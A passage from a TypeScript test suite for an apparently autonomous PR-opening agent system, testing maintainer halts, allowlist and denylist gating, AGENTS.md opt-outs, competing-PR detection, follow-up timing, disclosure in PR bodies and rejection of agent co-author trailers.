  assert.notEqual(adjacent.reason, "already-has-pr", "a hold is not a stand-down");
  assert.match(adjacent.state.events[0].message, /human triage/i);

  const clear = applyQueueLive(blank(), issue, undefined, { kind: "clear" });
  assert.equal(clear.packet?.issueNumber, 80);

  const unchecked = applyQueueLive(blank(), issue);
  assert.equal(unchecked.packet?.issueNumber, 80);
});

test("tick uses fetched AGENTS.md instead of YAML notes alone", () => {
  const forbidden = applyTick(blank(), [
    {
      ...live("ravidsrk/orca-fleet", 80, "docs tweak"),
      agentsMd: "Autonomous agents not allowed on this tracker.",
    },
  ]);
  assert.notEqual(forbidden.packet?.issueNumber, 80);

  const allowed = applyTick(blank(), [
    {
      ...live("ravidsrk/orca-fleet", 80, "docs tweak"),
      agentsMd: "Agents may open draft PRs.",
    },
  ]);
  assert.equal(allowed.packet?.issueNumber, 80);
  assert.equal(allowed.packet?.policy.code, "ALLOW");
});

test("halt sets scorecard banned, parks inflight, and blocks a new queue", () => {
  let state = applyTick(blank()).state;
  const repoId = state.packets[0].repoId;
  const halted = applyHalt(state, repoId, "maintainer asked the factory to stop");
  assert.equal(halted.error, undefined);
  assert.equal(halted.state.packets[0].status, "parked");
  assert.equal(halted.state.bans, 1);
  const row = halted.state.scorecard.find((r) => r.repoId === repoId);
  assert.equal(row?.maintainerTone, "banned");
  assert.equal(health(row!), "stop");
  const queued = applyQueueLive(halted.state, live(repoId, 99));
  assert.equal(queued.packet, null);
  assert.match(queued.reason, /halted/);
});

/**
 * The maintainer's same-hour stop (docs/PRODUCT.md:47, SPEC §7), typed the way a maintainer writes
 * it rather than the way `allowlist.yaml` spells it. Case-insensitive *lookup* alone made this
 * strictly worse than the loud refusal it replaced: `repoById` found the roster row, so the halt
 * reported success and pushed `bans` to 1, while every store it then wrote through — the scorecard
 * rows, the in-flight packets — was still matched on the raw argument and moved nothing. A halt
 * that says "halted" and halts nothing is the one failure mode this command cannot have
 * (issue #44 item 10).
 */
test("halt typed in GitHub's casing halts the roster's repo, not a repo that does not exist", () => {
  const state = seedState();
  const canonical = "ColeMurray/background-agents";
  const inflightBefore = state.packets.filter(
    (p) => p.repoId === canonical && INFLIGHT_STATUSES.includes(p.status),
  );
  assert.ok(inflightBefore.length > 0, "the seed must hold an in-flight packet or this binds nothing");
  assert.equal(state.bans, 0);

  const halted = applyHalt(state, "colemurray/background-agents", "maintainer asked us to stop");
  assert.equal(halted.error, undefined);
  // The row the operator meant, found by its own spelling — not by the argument's.
  assert.equal(halted.repoId, canonical);
  const row = halted.state.scorecard.find((r) => r.repoId === canonical)!;
  assert.equal(row.maintainerTone, "banned");
  assert.equal(health(row), "stop");
  assert.equal(repoHealth(halted.state.scorecard, canonical), "stop");
  assert.equal(halted.state.bans, 1);
  // ...and the work actually stopped.
  for (const before of inflightBefore) {
    assert.equal(halted.state.packets.find((p) => p.id === before.id)!.status, "parked");
  }
  assert.equal(
    halted.state.packets.filter((p) => p.repoId === canonical && INFLIGHT_STATUSES.includes(p.status)).length,
    0,
    "a halt that leaves the packet in flight has halted nothing",
  );
  // The event names the roster's spelling, so the ledger says which row moved.
  assert.match(halted.state.events[0].message, new RegExp(`Halted ${canonical}:`));

  // The gate agrees, in the operator's casing and in the roster's.
  for (const spelling of [canonical, "colemurray/background-agents", "COLEMURRAY/BACKGROUND-AGENTS"]) {
    const gate = maySelectRepo(halted.state, spelling);
    assert.equal(gate.ok, false, `${spelling} must be refused after the halt`);
    if (!gate.ok) assert.match(gate.reason, /halted on the scorecard/);
  }

  // Halting twice is idempotent on the counter — `bans` must stay 0 in the KPIs, so it must not
  // drift upward on a repeated stop (docs/08-operations.md).
  assert.equal(applyHalt(halted.state, "COLEMURRAY/BACKGROUND-AGENTS", "again").state.bans, 1);
});

test("halt still refuses a repo the roster does not know, loudly", () => {
  // The fail-CLOSED half. Case-insensitivity must widen matching, not admit strangers.
  for (const id of ["attacker/not-a-repo", "attacker/background-agents", "background-agents"]) {
    const refused = applyHalt(seedState(), id, "stop");
    assert.match(refused.error ?? "", /is not on the allowlist/, id);
    assert.equal(refused.state.bans, 0, id);
  }
});

/**
 * `maySelectRepo` checks `isDenied` before `repoById`, and the order is load-bearing rather than
 * incidental: reversed, a denied repo falls out as "not on the allowlist" — a true-sounding refusal
 * that names the wrong reason and would go on naming the wrong reason if the denylist and the
 * roster ever overlapped. `assertAllowlist` now keeps them disjoint case-insensitively, which is
 * what makes overlap a config error rather than a live hazard; this pins the ordering that stands
 * behind it (issue #44 item 10).
 */
test("the denylist is consulted before the roster, so a denial says why", () => {
  for (const spelling of ["matplotlib/matplotlib", "Matplotlib/MatPlotLib", "MATPLOTLIB/MATPLOTLIB"]) {
    const gate = maySelectRepo(blank(), spelling);
    assert.equal(gate.ok, false, spelling);
    if (!gate.ok) {
      assert.match(gate.reason, /Autonomous-agent PRs banned/, spelling);
      assert.doesNotMatch(
        gate.reason,
        /is not on the allowlist/,
        `${spelling}: roster-first would refuse it for the wrong reason`,
      );
    }
  }
  // The contrast that makes the assertion above mean something: an unlisted, undenied repo *does*
  // get the roster's refusal.
  const stranger = maySelectRepo(blank(), "attacker/orca-fleet");
  assert.equal(stranger.ok, false);
  if (!stranger.ok) assert.match(stranger.reason, /is not on the allowlist/);
});

/**
 * The third consequence of keying stores on the raw argument: a packet built from GitHub's casing
 * got a second packet-id namespace and credited a scorecard row that did not exist, so the row the
 * halt rules read (`opened`, and through it `halt_after_opens`) never moved. `buildPacket`
 * canonicalizes at the boundary, and `applyPacketToScorecard` matches the same way regardless
 * (issue #44 item 10).
 */
test("a packet scouted in GitHub's casing credits the roster's scorecard row", () => {
  const packet = buildPacket({
    repoId: "COLEMURRAY/BACKGROUND-AGENTS",
    issueNumber: 4242,
    issueTitle: "docs tweak",
    issueUrl: "https://github.com/ColeMurray/background-agents/issues/4242",
  });
  assert.equal(packet.repoId, "ColeMurray/background-agents");
  assert.equal(packet.id, "pkt_ColeMurray_background-agents_4242");
  // The policy record is an exact-key map; off-canonical it silently missed and the gate saw no
  // committed record at all.
  assert.equal(packet.policy.record?.repoId, "ColeMurray/background-agents");

  const rows = applyPacketToScorecard(emptyScorecard(), packet, "opened");
  const row = rows.find((r) => r.repoId === "ColeMurray/background-agents")!;
  assert.equal(row.opened, 1, "the roster's row is the only row there is — it must be the one credited");
  assert.equal(
    rows.reduce((a, r) => a + r.opened, 0),
    1,
    "exactly one row moved",
  );

  // And a packet already stored off-canonical (a hand-edited or pre-fix state file) still finds it.
  const legacy = { ...packet, repoId: "colemurray/background-agents" };
  const migrated = applyPacketToScorecard(emptyScorecard(), legacy, "opened");
  assert.equal(migrated.find((r) => r.repoId === "ColeMurray/background-agents")!.opened, 1);
});

test("findCompetingPull binds only a closing-keyword PR for this issue", () => {
  const url = "https://github.com/ravidsrk/orca-fleet/issues/71";
  const hit = findCompetingPull(
    [
      { title: "other", body: "see also #71", url: "https://github.com/ravidsrk/orca-fleet/pull/1" },
      { title: "fix validator", body: "Fixes #71", url: "https://github.com/ravidsrk/orca-fleet/pull/2" },
    ],
    71,
    url,
    "ravidsrk/orca-fleet",
  );
  assert.equal(hit?.url, "https://github.com/ravidsrk/orca-fleet/pull/2");
  assert.equal(
    findCompetingPull(
      [{ title: "other", body: "see also #71", url: "https://github.com/ravidsrk/orca-fleet/pull/1" }],
      71,
      url,
      "ravidsrk/orca-fleet",
    ),
    undefined,
  );
});

test("scout score carries no vestigial grok surface", () => {
  const packet = buildPacket({
    repoId: "ravidsrk/orca-fleet",
    issueNumber: 71,
    issueTitle: "[P2] Validator: one unreadable SKILL.md must not abort the catalog",
    issueUrl: "https://github.com/ravidsrk/orca-fleet/issues/71",
    labels: ["documentation"],
  });
  assert.equal("grok" in packet.scout.parts, false);
  assert.equal("grokRationale" in packet.scout, false);
});

test("a non-ahead compare cannot reach evidence attachment as fast-forward via the CLI binding path", () => {
  let state = applyTick(blank()).state;
  const id = state.packets[0].id;
  state = applyApprove(state, id, "attest").state;
  state = applyAdvance(state, id).state;
  state = applyAdvance(state, id).state;
  const packet = state.packets[0];
  const stale = bindingFromCompare({
    aheadBy: 0,
    filesChanged: 1,
    diffLines: 1,
    messages: [`Fixes #${packet.issueNumber}`],
  });
  assert.equal(stale.fastForward, false);
  const rejected = applyAttachEvidence(state, id, {
    baseSha: BASE,
    headSha: HEAD,
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert",
    filesChanged: 1,
    diffLines: 1,
    notes: [],
  }, stale);
  assert.match(rejected.error ?? "", /fast-forward/);
  const derived = bindingFromCompare({
    aheadBy: 2,
    filesChanged: 1,
    diffLines: 1,
    messages: [`Fixes #${packet.issueNumber}`],
  });
  assert.equal(derived.fastForward, true);
});

test("classifyCompetition: closing keyword is competing, plain mention is adjacent", () => {
  const url = "https://github.com/ravidsrk/orca-fleet/issues/71";
  const repo = "ravidsrk/orca-fleet";
  const closing = classifyCompetition(
    { pulls: [{ title: "fix", body: "Fixes #71", url: "https://github.com/ravidsrk/orca-fleet/pull/2" }] },
    71,
    url,
    repo,
  );
  assert.equal(closing.kind, "competing");
  if (closing.kind === "competing") assert.equal(closing.why, "closing-keyword");

  const plain = classifyCompetition(
    { pulls: [{ title: "refactor", body: "see also #71 for context", url: "https://github.com/ravidsrk/orca-fleet/pull/3" }] },
    71,
    url,
    repo,
  );
  assert.equal(plain.kind, "adjacent");
  if (plain.kind === "adjacent") assert.equal(plain.why, "plain-mention");
});

test("classifyCompetition: timeline-linked open PR competes with no textual mention", () => {
  const url = "https://github.com/ravidsrk/orca-fleet/issues/71";
  const verdict = classifyCompetition(
    {
      pulls: [{ title: "unrelated", body: "no mention at all", url: "https://github.com/ravidsrk/orca-fleet/pull/9" }],
      crossReferencedPullUrls: ["https://github.com/ravidsrk/orca-fleet/pull/9"],
    },
    71,
    url,
    "ravidsrk/orca-fleet",
  );
  assert.equal(verdict.kind, "competing");
  if (verdict.kind === "competing") assert.equal(verdict.why, "timeline-link");
});

test("classifyCompetition: branch name naming the issue is adjacent; foreign repo mention is clear", () => {
  const url = "https://github.com/ravidsrk/orca-fleet/issues/71";
  const branch = classifyCompetition(
    { pulls: [{ title: "wip", body: "", url: "https://github.com/ravidsrk/orca-fleet/pull/4", headRef: "fix/71-validator" }] },
    71,
    url,
    "ravidsrk/orca-fleet",
  );
  assert.equal(branch.kind, "adjacent");
  if (branch.kind === "adjacent") assert.equal(branch.why, "branch-name");

  const foreign = classifyCompetition(
    { pulls: [{ title: "x", body: "Fixes other-owner/other-repo#71", url: "https://github.com/ravidsrk/orca-fleet/pull/5" }] },
    71,
    url,
    "ravidsrk/orca-fleet",
  );
  assert.equal(foreign.kind, "clear");
});

test("tick holds an adjacent-flagged issue for human triage instead of scouting it", () => {
  const state = blank();
  const issue: ScoutIssue = {
    repoId: "ravidsrk/orca-fleet",
    number: 71,
    title: "[P2] Validator: one unreadable SKILL.md must not abort the catalog",
    url: "https://github.com/ravidsrk/orca-fleet/issues/71",
    labels: ["documentation"],
    daysOld: 1,
    scout: { total: 0, parts: { wave: 0, labels: 0, size: 0, freshness: 0 } },
  };
  const result = applyTick(state, [issue], [], [
    "ravidsrk/orca-fleet#71",
    "ravidsrk/frontguard#195",
  ]);
  assert.equal(result.packet, null);
  assert.equal(result.reason, "idle");
  assert.equal(
    result.state.events.some((e) => e.message.includes("adjacent")),
    true,
  );
});

test("competition precedence and the direct reference helpers", () => {
  const url = "https://github.com/ravidsrk/orca-fleet/issues/71";
  const repo = "ravidsrk/orca-fleet";
  assert.equal(referencesIssue("see also #71", 71, url, repo), true);
  assert.equal(referencesIssue("PR #71 tracks this", 71, url, repo), true);
  assert.equal(referencesIssue("other-owner/other-repo#71", 71, url, repo), false);
  assert.equal(referencesIssue(`context: ${url}`, 71, url, repo), true);
  assert.equal(branchMentionsIssue("fix/71-validator", 71), true);
  assert.equal(branchMentionsIssue("high71", 71), false);
  assert.equal(branchMentionsIssue("fix-710", 71), false);

  const both = classifyCompetition(
    {
      pulls: [{ title: "wip", body: "see also #71", url: "https://github.com/ravidsrk/orca-fleet/pull/9", headRef: "fix/71-x" }],
      crossReferencedPullUrls: ["https://github.com/ravidsrk/orca-fleet/pull/9"],
    },
    71,
    url,
    repo,
  );
  assert.equal(both.kind, "competing");
  if (both.kind === "competing") assert.equal(both.why, "timeline-link");

  const keywordBeatsTimeline = classifyCompetition(
    {
      pulls: [{ title: "fix", body: "Fixes #71", url: "https://github.com/ravidsrk/orca-fleet/pull/2" }],
      crossReferencedPullUrls: ["https://github.com/ravidsrk/orca-fleet/pull/9"],
    },
    71,
    url,
    repo,
  );
  assert.equal(keywordBeatsTimeline.kind, "competing");
  if (keywordBeatsTimeline.kind === "competing") assert.equal(keywordBeatsTimeline.why, "closing-keyword");
});

function prMetaAt(updatedAt: string, over: Record<string, unknown> = {}) {
  return {
    url: "https://github.com/ColeMurray/background-agents/pull/1652",
    title: "Differentiate the right sidebar toggle icon by state",
    draft: true,
    state: "open" as const,
    merged: false,
    mergeable: "blocked",
    commits: 1,
    reviewComments: 0,
    issueComments: 1,
    headSha: "48c2242683705b00503d3436575bf3c28b1b0c9b",
    updatedAt,
    syncedAt: updatedAt,
    ...over,
  };
}

test("answered threads plus 14 quiet days release the in-flight slot", () => {
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted");
  assert.ok(submitted);
  const at = "2026-09-20T00:00:00.000Z";
  const result = applyPrSync(state, submitted!.id, prMetaAt("2026-09-01T00:00:00.000Z"), {
    threadsAnswered: true,
    at,
  });
  assert.equal(result.error, undefined);
  const after = result.state.packets.find((p) => p.id === submitted!.id);
  assert.equal(after?.status, "followed-up");
  assert.equal(hasInflight(result.state.packets), false);
  assert.equal(after?.followUps?.some((f) => f.kind === "quiet"), true);
});

test("13 quiet days do not release the slot; unanswered threads never do", () => {
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted");
  const at = "2026-09-14T00:00:00.000Z";
  const early = applyPrSync(state, submitted!.id, prMetaAt("2026-09-01T00:00:00.000Z"), {
    threadsAnswered: true,
    at,
  });
  assert.equal(early.state.packets.find((p) => p.id === submitted!.id)?.status, "submitted");
  const unanswered = applyPrSync(state, submitted!.id, prMetaAt("2026-08-01T00:00:00.000Z"), {
    threadsAnswered: false,
    at: "2026-09-20T00:00:00.000Z",
  });
  assert.equal(unanswered.state.packets.find((p) => p.id === submitted!.id)?.status, "submitted");
});

test("maintainer activity on a followed-up packet re-blocks the factory", () => {
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted");
  const released = applyPrSync(state, submitted!.id, prMetaAt("2026-09-01T00:00:00.000Z"), {
    threadsAnswered: true,
    at: "2026-09-20T00:00:00.000Z",
  });
  const woken = applyPrSync(released.state, submitted!.id, prMetaAt("2026-09-21T08:00:00.000Z", { issueComments: 2 }), {
    threadsAnswered: false,
    at: "2026-09-21T09:00:00.000Z",
  });
  const after = woken.state.packets.find((p) => p.id === submitted!.id);
  assert.equal(after?.status, "submitted");
  assert.equal(hasInflight(woken.state.packets), true);
});

test("wake does not reclaim submitted when another packet already holds the in-flight slot", () => {
  // Reproduces issue #34 vector (b): A quiet-releases, B gets ticked into the freed slot, then
  // maintainer activity on A must not double the in-flight count.
  const state = seedState();
  const a = state.packets.find((p) => p.status === "submitted")!;
  const released = applyPrSync(state, a.id, prMetaAt("2026-09-01T00:00:00.000Z"), {
    threadsAnswered: true,
    at: "2026-09-20T00:00:00.000Z",
  });
  assert.equal(released.state.packets.find((p) => p.id === a.id)?.status, "followed-up");
  assert.equal(hasInflight(released.state.packets), false);

  const b = buildPacket({
    repoId: "github/awesome-copilot",
    issueNumber: 2684,
    issueTitle: "operator ticked this while A was quiet",
    issueUrl: "https://github.com/github/awesome-copilot/issues/2684",
  });
  const withB: FactoryState = {
    ...released.state,
    packets: [{ ...b, status: "gated", station: "freeze" }, ...released.state.packets],
  };
  assert.equal(hasInflight(withB.packets), true);
  assert.equal(inflightCount(withB.packets), 1);

  const woken = applyPrSync(withB, a.id, prMetaAt("2026-09-21T08:00:00.000Z", { issueComments: 2 }), {
    threadsAnswered: false,
    at: "2026-09-21T09:00:00.000Z",
  });
  assert.equal(woken.error, undefined);
  const afterA = woken.state.packets.find((p) => p.id === a.id)!;
  const afterB = woken.state.packets.find((p) => p.id === b.id)!;
  // A stays followed-up: the newer in-flight packet (B) keeps priority, the slot is not doubled.
  assert.equal(afterA.status, "followed-up");
  assert.equal(afterB.status, "gated");
  assert.equal(inflightCount(woken.state.packets), 1);
  // The maintainer activity is not silently dropped: it is recorded as a reply owed on A.
  // `review-reply` means a reply that was made; a reply still owed is a prefixed note.
  assert.equal(
    afterA.followUps?.some((f) => f.kind === "note" && f.body.startsWith("reply-owed:")),
    true,
  );
  assert.equal(afterA.followUps?.some((f) => f.kind === "review-reply"), false);
  // The event must distinguish the held-slot wake from the ordinary one. A loose /reply|maintainer
  // activity/ matched the pre-fix text too, so it proved nothing: both messages open with
  // "Maintainer activity on <url>". Pin what changed — the reply is owed, the packet did NOT
  // reclaim the slot — and forbid the pre-fix claim, which would be false here: no tick was blocked.
  const wake = woken.state.events.find((e) => e.packetId === a.id && e.kind === "follow-up");
  assert.ok(wake, "no follow-up event was recorded for the woken packet");
  assert.match(wake.message, /reply owed/i);
  assert.match(wake.message, /in-flight slot is held by another packet/i);
  assert.match(wake.message, new RegExp(`${a.id} stays followed-up`));
  assert.doesNotMatch(wake.message, /before any new tick/i);
});

test("merged and closed syncs write the scorecard and end follow-up", () => {
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted");
  const merged = applyPrSync(state, submitted!.id, prMetaAt("2026-09-01T00:00:00.000Z", { merged: true, state: "closed" }), {
    threadsAnswered: true,
    at: "2026-09-02T00:00:00.000Z",
  });
  const mergedPacket = merged.state.packets.find((p) => p.id === submitted!.id);
  assert.equal(mergedPacket?.status, "merged");
  const mergedRow = merged.state.scorecard.find((r) => r.repoId === submitted!.repoId);
  assert.equal(mergedRow?.merged, 1);

  const closed = applyPrSync(state, submitted!.id, prMetaAt("2026-09-01T00:00:00.000Z", { state: "closed" }), {
    threadsAnswered: true,
    at: "2026-09-02T00:00:00.000Z",
  });
  const closedPacket = closed.state.packets.find((p) => p.id === submitted!.id);
  assert.equal(closedPacket?.status, "followed-up");
  const closedRow = closed.state.scorecard.find((r) => r.repoId === submitted!.repoId);
  assert.equal(closedRow?.closedUnmerged, 1);
});

test("45 quiet days record a stale-intent note but never auto-close", () => {
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted");
  const result = applyPrSync(state, submitted!.id, prMetaAt("2026-08-28T00:00:00.000Z"), {
    threadsAnswered: true,
    at: "2026-10-20T00:00:00.000Z",
  });
  const after = result.state.packets.find((p) => p.id === submitted!.id);
  assert.equal(after?.status, "followed-up");
  assert.equal(
    after?.followUps?.some((f) => f.kind === "note" && f.body.includes("stale-intent")),
    true,
  );
  assert.equal(after?.prMeta?.state, "open");
});

test("re-syncing a closed PR writes closedUnmerged exactly once; merged bumps mergedTotal", () => {
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted");
  const closedMeta = prMetaAt("2026-09-01T00:00:00.000Z", { state: "closed" });
  const once = applyPrSync(state, submitted!.id, closedMeta, { threadsAnswered: true, at: "2026-09-02T00:00:00.000Z" });
  const twice = applyPrSync(once.state, submitted!.id, closedMeta, { threadsAnswered: true, at: "2026-09-03T00:00:00.000Z" });
  const thrice = applyPrSync(twice.state, submitted!.id, closedMeta, { threadsAnswered: true, at: "2026-09-04T00:00:00.000Z" });
  const row = thrice.state.scorecard.find((r) => r.repoId === submitted!.repoId);
  assert.equal(row?.closedUnmerged, 1);

  const merged = applyPrSync(state, submitted!.id, prMetaAt("2026-09-01T00:00:00.000Z", { merged: true, state: "closed" }), {
    threadsAnswered: true,
    at: "2026-09-02T00:00:00.000Z",
  });
  assert.equal(merged.state.mergedTotal, state.mergedTotal + 1);
  const again = applyPrSync(merged.state, submitted!.id, prMetaAt("2026-09-05T00:00:00.000Z", { merged: true, state: "closed" }), {
    threadsAnswered: true,
    at: "2026-09-06T00:00:00.000Z",
  });
  assert.match(again.error ?? "", /cannot sync/);
});

test("quiet-day thresholds hold at their exact boundaries", () => {
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted");
  const at14 = applyPrSync(state, submitted!.id, prMetaAt("2026-09-01T00:00:00.000Z"), {
    threadsAnswered: true,
    at: "2026-09-15T00:00:00.000Z",
  });
  assert.equal(at14.state.packets.find((p) => p.id === submitted!.id)?.status, "followed-up");

  const at45 = applyPrSync(state, submitted!.id, prMetaAt("2026-09-01T00:00:00.000Z"), {
    threadsAnswered: true,
    at: "2026-10-16T00:00:00.000Z",
  });
  const after45 = at45.state.packets.find((p) => p.id === submitted!.id);
  assert.equal(after45?.followUps?.some((f) => f.kind === "note" && f.body.startsWith("stale-intent")), true);
  const scorecardRow = at45.state.scorecard.find((r) => r.repoId === submitted!.repoId);
  assert.equal(scorecardRow?.closedUnmerged, 0);
});

test("renderPrBody speaks to maintainers: no internal jargon, one closing reference", () => {
  const packet = buildPacket({
    repoId: "ravidsrk/orca-fleet",
    issueNumber: 71,
    issueTitle: "[P2] Validator: one unreadable SKILL.md must not abort the catalog",
    issueUrl: "https://github.com/ravidsrk/orca-fleet/issues/71",
    labels: ["documentation"],
  });
  const body = renderPrBody(packet);
  assert.equal(/Policy:/.test(body), false);
  assert.equal(/Scout score/.test(body), false);
  assert.equal(/[Ll]ighting/.test(body), false);
  assert.equal(body.includes(DISCLOSURE), true);
  const closings = body.match(/close[sd]?\s+#\d+|fix(?:e[sd])?\s+#\d+|resolve[sd]?\s+#\d+/gi) ?? [];
  assert.equal(closings.length, 1);
  assert.equal(body.includes(packet.issueUrl), false);
});

test("evidence refuses agent sign-offs and agent co-author trailers in the commit range", () => {
  let state = applyTick(blank()).state;
  const id = state.packets[0].id;
  state = applyApprove(state, id, "attest").state;
  state = applyAdvance(state, id).state;
  state = applyAdvance(state, id).state;
  const packet = state.packets[0];
  const evidence = {
    baseSha: BASE,
    headSha: HEAD,
    testCommand: "true",
    testExit: 0,
    negativeControl: "red-on-revert" as const,
    filesChanged: 1,
    diffLines: 1,
    notes: [],
  };
  const bad = applyAttachEvidence(state, id, evidence, bindingFor(packet, {
    messages: [`fix: validator\n\nFixes #${packet.issueNumber}\n\nSigned-off-by: Foundry <bot@example.com>`],
  }));
  assert.match(bad.error ?? "", /signed-off-by/i);

  const coauthored = applyAttachEvidence(state, id, evidence, bindingFor(packet, {
    messages: [`fix: validator\n\nFixes #${packet.issueNumber}\n\nCo-authored-by: Claude <noreply@anthropic.com>`],
  }));
  assert.match(coauthored.error ?? "", /co-authored-by/i);

  const clean = applyAttachEvidence(state, id, evidence, bindingFor(packet));
  assert.equal(clean.error, undefined);
});

test("commitTrailerViolation inspects every co-author line and the configured convention", () => {
  const humanFirstAgentSecond = [
    "fix: x\n\nCo-authored-by: Jane Doe <jane@example.com>\nCo-authored-by: Claude <noreply@anthropic.com>",
  ];
  assert.match(commitTrailerViolation(humanFirstAgentSecond, "pr-body-only") ?? "", /co-authored-by/i);

  const humansOnly = ["fix: x\n\nCo-authored-by: Jane <jane@example.com>\nCo-authored-by: Sam <sam@example.com>"];
  assert.equal(commitTrailerViolation(humansOnly, "pr-body-only"), undefined);

  assert.match(commitTrailerViolation(["fix: y"], "assisted-by") ?? "", /missing/i);
  assert.equal(commitTrailerViolation(["fix: y\n\nAssisted-by: Foundry"], "assisted-by"), undefined);
  assert.match(commitTrailerViolation(["fix: y\n\nAssisted-by: SomeOtherTool"], "assisted-by") ?? "", /missing/i);
  assert.equal(commitTrailerViolation(["docs: z\n\nGenerated-by: Foundry"], "generated-by"), undefined);
  assert.match(commitTrailerViolation(["docs: z\n\nAssisted-by: Foundry"], "generated-by") ?? "", /missing/i);
});

test("approve records the attesting identity, defaulting to operator", () => {
  let state = applyTick(blank()).state;
  const id = state.packets[0].id;
  const named = applyApprove(state, id, "checked the packet", "ravidsrk");
  assert.equal(named.state.packets[0].humanAttest?.by, "ravidsrk");
  const anon = applyApprove(state, id, "checked the packet");
  assert.equal(anon.state.packets[0].humanAttest?.by, "operator");
});

test("ledger divergences: mechanical drift names the sync command, doctrine drift stands alone", () => {
  const seed = seedState();
  const submitted = seed.packets.find((p) => p.status === "submitted")!;
  const mergedUpstream = packetDivergences(submitted, {
    state: "closed",
    merged: true,
    draft: false,
    headSha: submitted.prMeta?.headSha ?? "",
    body: VERBATIM_BODY,
  });
  assert.equal(mergedUpstream.some((d) => d.includes(`sync ${submitted.id}`)), true);

  const draftFlip = packetDivergences(submitted, {
    state: "open",
    merged: false,
    draft: !(submitted.prMeta?.draft ?? false),
    headSha: submitted.prMeta?.headSha ?? "",
    body: VERBATIM_BODY,
  });
  assert.equal(draftFlip.some((d) => /draft=/.test(d) && /by hand|doctrine/.test(d)), true);

  const mergedPacket = seed.packets.find((p) => p.status === "merged" && p.prUrl)!;
  const ghost = packetDivergences(mergedPacket, {
    state: "open",
    merged: false,
    draft: true,
    headSha: "0000000000000000000000000000000000000000",
    body: VERBATIM_BODY,
  });
  assert.equal(ghost.some((d) => /ledger says merged/.test(d)), true);

  // A ledger that agrees with GitHub on every recorded field reports no divergence. Since #49 the
  // seed's in-flight packet also carries a re-witness debt (evidence at 48c2242, head at 6b6ff04),
  // which is an advisory and not a divergence — so read the two apart rather than asserting the
  // flat list is empty, which would pass again only if that debt were erased.
  const clean = packetChecks(submitted, {
    state: "open",
    merged: false,
    draft: submitted.prMeta?.draft ?? false,
    headSha: submitted.prMeta?.headSha ?? "",
    body: VERBATIM_BODY,
  });
  assert.deepEqual(clean.fatal, []);
  assert.equal(
    clean.advisory.some((a) => a.includes("evidence witnessed at")),
    true,
    "the re-witness debt is still owed on a ledger that reconciles",
  );
});

test("an absorbed close is at rest: reconcile-style re-diff reports no divergence", () => {
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted")!;
  // A close a real sync absorbed, which means the review endpoints answered: `syncGithubPr` reads
  // them for any terminal PR, and `recordTerminalReview` folds the result into the scorecard on the
  // closedUnmerged transition. A fixture that omits it is not an absorbed close — it is an absorbed
  // close with a hole in it, which is the subject of the second half of this test.
  const closedMeta = prMetaAt("2026-09-01T00:00:00.000Z", {
    state: "closed",
    humanReview: { reviews: 1, comments: 2 },
  });
  const absorbed = applyPrSync(state, submitted.id, closedMeta, {
    threadsAnswered: false,
    at: "2026-09-02T00:00:00.000Z",
  });
  const after = absorbed.state.packets.find((p) => p.id === submitted.id)!;
  const live = {
    state: "closed" as const,
    merged: false,
    draft: closedMeta.draft,
    headSha: closedMeta.headSha,
    body: VERBATIM_BODY,
  };
  assert.deepEqual(packetDivergences(after, live), []);
  const unabsorbed = packetDivergences(submitted, live);
  assert.equal(unabsorbed.some((d) => d.includes(`sync ${submitted.id}`)), true);

  // The same absorbed close with the review endpoints down for that one request (issue #39 round
  // 3). `recordTerminalReview` correctly refuses to write a zero it never saw, so the scorecard
  // counts the closedUnmerged and excludes it from noReview's denominator — a KPI computed over a
  // population nobody was told was short. It is still not a DIVERGENCE (the ledger contradicts
  // nothing GitHub says), and it must not be silent either.
  const blindMeta = prMetaAt("2026-09-01T00:00:00.000Z", { state: "closed" });
  const blind = applyPrSync(state, submitted.id, blindMeta, {
    threadsAnswered: false,
    at: "2026-09-02T00:00:00.000Z",
  });
  const unobserved = blind.state.packets.find((p) => p.id === submitted.id)!;
  const checks = packetChecks(unobserved, live);
  assert.deepEqual(checks.fatal, [], "an unobserved review KPI is not the ledger contradicting GitHub");
  assert.equal(
    checks.advisory.some((a) => a.includes(submitted.id) && /no human-review observation/.test(a)),
    true,
    `a terminal outcome outside the KPI's denominator must be said out loud:\n${checks.advisory.join("\n")}`,
  );
  // And the control: the observed close above raises no such line, or the advisory means nothing.
  assert.equal(
    packetChecks(after, live).advisory.some((a) => /no human-review observation/.test(a)),
    false,
  );
});

test("a rejected packet with a still-open PR never rots invisibly in the ledger check", () => {
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted")!;
  const rejected = applyReject(state, submitted.id, "operator mis-typed reject").state.packets.find(
    (p) => p.id === submitted.id,
  )!;
  assert.equal(rejected.status, "rejected");
  assert.equal(rejected.prUrl, submitted.prUrl);

  const stillLive = packetDivergences(rejected, {
    state: "open",
    merged: false,
    draft: submitted.prMeta?.draft ?? true,
    headSha: submitted.prMeta?.headSha ?? "",
    body: VERBATIM_BODY,
  });
  assert.equal(
    stillLive.some((d) => d.includes(rejected.id) && d.includes(rejected.prUrl!)),
    true,
  );

  // Once the abandoned PR is actually closed on GitHub, there is nothing left to flag.
  const nowClosed = packetDivergences(rejected, {
    state: "closed",
    merged: false,
    draft: submitted.prMeta?.draft ?? true,
    headSha: submitted.prMeta?.headSha ?? "",
    body: VERBATIM_BODY,
  });
  assert.deepEqual(nowClosed, []);
});

test("a parked packet with a still-open PR never rots invisibly in the ledger check", () => {
  const state = seedState();
  const submitted = state.packets.find((p) => p.status === "submitted")!;
  assert.ok(submitted.prUrl);
  // applyHalt parks whatever is in flight — including a submitted packet still holding a live
  // draft. `parked` is the other half of the abandoned-PR surface; `rejected` alone is not enough.
  const halted = applyHalt(state, submitted.repoId, "maintainer asked the factory to stop");
  const parked = halted.state.packets.find((p) => p.id === submitted.id)!;
  assert.equal(parked.status, "parked");
  assert.equal(parked.prUrl, submitted.prUrl);

  const stillLive = packetDivergences(parked, {
    state: "open",
    merged: false,
    draft: submitted.prMeta?.draft ?? true,
    headSha: submitted.prMeta?.headSha ?? "",
    body: VERBATIM_BODY,
  });
  assert.equal(
    stillLive.some(
      (d) => d.includes(parked.id) && d.includes(parked.prUrl!) && d.includes("parked"),
    ),
